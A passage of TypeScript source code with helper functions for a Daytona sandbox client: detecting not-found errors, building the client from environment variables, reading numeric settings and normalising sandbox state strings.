    resourceId: remoteId,
  });
}

function isDaytonaNotFoundError(error: unknown): boolean {
  if (error instanceof DaytonaNotFoundError) {
    return true;
  }

  if (error instanceof DaytonaError && error.statusCode === 404) {
    return true;
  }

  if (typeof error !== "object" || error === null) {
    return false;
  }

  const candidate = error as {
    statusCode?: unknown;
    response?: {
      status?: unknown;
    };
  };

  return candidate.statusCode === 404 || candidate.response?.status === 404;
}

function createDaytonaClient() {
  const apiKey = process.env.DAYTONA_API_KEY;
  if (!apiKey) {
    throw new Error("DAYTONA_API_KEY is required to provision a sandbox.");
  }

  return new Daytona({
    apiKey,
    apiUrl: process.env.DAYTONA_API_URL,
    target: process.env.DAYTONA_TARGET,
  });
}

function readNumberEnv(name: string, fallback: number) {
  const value = process.env[name];
  if (!value) {
    return fallback;
  }
  const parsed = Number(value);
  return Number.isFinite(parsed) ? parsed : fallback;
}

function normalizeRemoteSandboxState(state: string | undefined): RemoteSandboxState {
  if (!state) {
    return "unknown";
  }

  const normalized = state.toLowerCase();
  if (normalized === "started") {
    return "started";
  }
  if (normalized === "stopped") {
    return "stopped";
  }
  if (normalized === "archived") {
    return "archived";
  }
  if (normalized === "destroyed" || normalized === "deleted") {
    return "destroyed";
  }
  if (normalized === "error" || normalized === "failed") {
    return "error";
  }
  return "unknown";
}
